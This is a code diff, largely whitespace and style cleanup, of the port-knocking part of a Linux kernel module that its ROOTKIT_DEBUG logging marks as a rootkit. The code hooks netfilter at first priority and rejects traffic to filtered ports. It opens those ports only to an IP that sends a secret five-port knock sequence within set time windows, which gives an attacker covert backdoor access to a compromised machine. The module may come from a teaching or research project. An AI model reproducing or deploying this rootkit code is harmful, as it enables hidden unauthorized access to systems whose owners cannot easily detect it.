@@ -39,7 +39,8 @@ static struct nf_hook_ops hook;
 /* port triggering setup */
 static unsigned int tcp_state = 0;
 static unsigned int udp_state = 0;
-static unsigned short port_order[5] = {12345, 666, 23, 1337, 42};
+static unsigned short port_order[5] = { 12345, 666, 23, 1337, 42 };
+
 static struct timespec tcp_time;
 static struct timespec udp_time;
 static __u32 ipaddr;
@@ -51,106 +52,99 @@ static __u32 ipaddr;
  * If this is the case (or it belongs to an unblocked port), then it returns
  * false (let through), otherwise it returns true (drop and reject).
  */
-static int
-is_port_blocked (struct sk_buff *skb) {
-	struct iphdr *ip_header = (struct iphdr *) skb_network_header(skb);
+static int is_port_blocked(struct sk_buff *skb)
+{
+	struct iphdr *ip_header = (struct iphdr *)skb_network_header(skb);
 	struct tcphdr *tcp_header;
 	struct udphdr *udp_header;
-	
+
 	unsigned short port;
-	
 
 	/* check tree for TCP */
 	if (ip_header->protocol == IPPROTO_TCP) {
 
 		/* get the tcp header */
-		tcp_header = (struct tcphdr *) skb_transport_header(skb);
+		tcp_header = (struct tcphdr *)skb_transport_header(skb);
 		port = ntohs(tcp_header->dest);
-		
+
 		/* work the state machine */
-		if(tcp_state < 5) {
-			if(port_order[tcp_state] == port) {
-				if(tcp_state == 0) {
+		if (tcp_state < 5) {
+			if (port_order[tcp_state] == port) {
+				if (tcp_state == 0) {
 					getnstimeofday(&tcp_time);
 					tcp_state++;
 				} else {
 					struct timespec cur;
 					getnstimeofday(&cur);
-					
-					if(cur.tv_sec - tcp_time.tv_sec > 2) {
+
+					if (cur.tv_sec - tcp_time.tv_sec > 2)
 						tcp_state = 0;
-					} else {
+					else
 						tcp_state++;
-					}
 				}
 			}
-			
 			//ROOTKIT_DEBUG("Packet detected on TCP Port %u. State is now %u.\n",
-			//	port, tcp_state);
+			//      port, tcp_state);
 		}
-		
+
 		/* check if the port matches */
-		if(is_knocked_tcp(port)) {
-			ROOTKIT_DEBUG("Received packet on filtered TCP port %u from IP %pI4.\n",
-				port, &ip_header->saddr);
-			
+		if (is_knocked_tcp(port)) {
+			ROOTKIT_DEBUG
+			    ("Received packet on filtered TCP port %u from IP %pI4.\n",
+			     port, &ip_header->saddr);
+
 			/* check if we are in the correct state */
-			if(tcp_state == 5 || ip_header->saddr == ipaddr) {
+			if (tcp_state == 5 || ip_header->saddr == ipaddr) {
 				tcp_state = 0;	/* reset the state */
 				ipaddr = ip_header->saddr;
 				return 0;	/* allow it */
-			} else {
+			} else
 				return 1;	/* reject it */
-			}
-			
 		}
 	}
 
 	/* check tree for UDP */
 	if (ip_header->protocol == IPPROTO_UDP) {
-
 		/* get the udp header */
-		udp_header = (struct udphdr *) skb_transport_header(skb);
+		udp_header = (struct udphdr *)skb_transport_header(skb);
 		port = ntohs(udp_header->dest);
-		
+
 		/* work the state machine */
-		if(udp_state < 5) {
-			if(port_order[udp_state] == port) {
-				if(udp_state == 0) {
+		if (udp_state < 5) {
+			if (port_order[udp_state] == port) {
+				if (udp_state == 0) {
 					getnstimeofday(&udp_time);
 					udp_state++;
 				} else {
 					struct timespec cur;
 					getnstimeofday(&cur);
-					
-					if(cur.tv_sec - udp_time.tv_sec > 2) {
+
+					if (cur.tv_sec - udp_time.tv_sec > 2)
 						udp_state = 0;
-					} else {
+					else
 						udp_state++;
-					}
 				}
 			}
 			//ROOTKIT_DEBUG("Packet detected on UDP Port %u. State is now %u.\n",
-			//	port, udp_state);
+			//      port, udp_state);
 		}
 
 		/* check if the port matches */
-		if(is_knocked_udp(port)) {
-			ROOTKIT_DEBUG("Received packet on filtered UDP port %u from IP %pI4.\n",
-				port, &ip_header->saddr);
-			
+		if (is_knocked_udp(port)) {
+			ROOTKIT_DEBUG
+			    ("Received packet on filtered UDP port %u from IP %pI4.\n",
+			     port, &ip_header->saddr);
+
 			/* check if we are in the correct state */
-			if(udp_state == 5 || ip_header->saddr == ipaddr) {
+			if (udp_state == 5 || ip_header->saddr == ipaddr) {
 				udp_state = 0;	/* reset the state */
 				ipaddr = ip_header->saddr;
 				return 0;	/* allow it */
-			} else {
+			} else
 				return 1;	/* reject it */
-			}
-			
 		}
 	}
-	return 0;	/* allow it */
+	return 0;		/* allow it */
 }
 
 /* 
@@ -158,58 +152,56 @@ is_port_blocked (struct sk_buff *skb) {
  * It is of type nf_hookfn (see netfilter.h).
  */
 unsigned int
-knocking_hook (void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
+knocking_hook(void *priv, struct sk_buff *skb,
+	      const struct nf_hook_state *state)
 {
 	struct iphdr *ip_header;
-	
+
 	/* check if we need to block this packet */
-	if(is_port_blocked(skb)) {
-		ip_header = (struct iphdr *) skb_network_header(skb);
+	if (is_port_blocked(skb)) {
+		ip_header = (struct iphdr *)skb_network_header(skb);
 
 		/* 
 		 * craft an appropriate REJECT response
 		 */
-		if(ip_header->protocol == IPPROTO_TCP) {
+		if (ip_header->protocol == IPPROTO_TCP)
 			nf_send_reset(state->net, skb, state->hook);	/* send TCP RST */
-		} else if(ip_header->protocol == IPPROTO_UDP) {
-			nf_send_unreach(skb, 3, state->hook);		/* send icmp port unreachable */
-		}
+		else if (ip_header->protocol == IPPROTO_UDP)
+			nf_send_unreach(skb, 3, state->hook);	/* send icmp port unreachable */
 
 		/* we can now safely drop the packet */
 		ROOTKIT_DEBUG("Dropped a packet due to port knocking.\n");
 		return NF_DROP;
 
-	} else {
-		/* let the packet through */
+	} else	/* let the packet through */
 		return NF_ACCEPT;
-	}
-
 }
 
 /* enable port knocking */
-int
-load_port_knocking (void)
+int load_port_knocking(void)
 {
-	int ret;
-	
-	ROOTKIT_DEBUG("Starting to load the port knocking...\n");
+	int retv;
+
+	ROOTKIT_DEBUG("Loading port knocking...\n");
 
 	/* reset the states */
 	tcp_state = udp_state = 0;
 	ipaddr = 0;
-	
+
 	/* setup everything for the netfilter hook */
-	hook.hook = knocking_hook;		/* our function */
+	hook.hook = knocking_hook;	/* our function */
 	hook.hooknum = NF_INET_LOCAL_IN;	/* grab everything that comes in */
-	hook.pf = PF_INET;			/* we only care about ipv4 */
+	hook.pf = PF_INET;	/* we only care about ipv4 */
 	hook.priority = NF_IP_PRI_FIRST;	/* respect my prioritah */
 
 	/* actually do the hook */
-	ret = nf_register_hook(&hook);
+	retv = nf_register_hook(&hook);
 
-	if(ret < 0) {
-		ROOTKIT_DEBUG("Error enabling port knocking. Return of nf_register_hook = %d\n", ret);
-		return ret;
+	if (retv < 0) {
+		ROOTKIT_DEBUG
+		    ("Error enabling port knocking. Return of nf_register_hook = %d\n",
+		     retv);
+		return retv;
 	}
 
 	/* log our success */
@@ -218,8 +210,7 @@ load_port_knocking (void)
 }
 
 /* disable port knocking */
-void
-unload_port_knocking (void)
+void unload_port_knocking(void)
 {
 	ROOTKIT_DEBUG("Starting to unload the port knocking...\n");
 
